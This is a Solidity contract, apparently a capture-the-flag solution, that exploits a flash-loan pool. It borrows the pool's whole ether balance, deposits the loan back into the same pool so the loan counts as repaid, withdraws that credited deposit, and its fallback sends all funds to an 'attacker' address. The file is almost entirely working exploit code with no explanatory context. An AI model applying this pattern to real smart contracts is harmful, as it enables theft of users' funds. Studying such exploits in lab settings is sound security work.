pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract FlashLoanEtherReceiver {  
    address pool;
    uint256 balance;
    address attacker ;
    constructor(address _pool,address _attacker) public {
        pool = _pool;
        attacker = _attacker;
    }

    function deposit() external payable {
        balance += msg.value;
    }

    function callFlashLoan() external {
        uint256 bal = address(pool).balance;
        IFlashLoanPool(pool).flashLoan(bal);
    }
    function execute() external payable {
        uint256 bal = address(this).balance;
        IFlashLoanPool(pool).deposit{value: bal}();
    }

    function withdrawFromPool() external payable {
        IFlashLoanPool(pool).withdraw();
    }

    fallback() external payable {
        payable(attacker).transfer(address(this).balance);

    }

}
 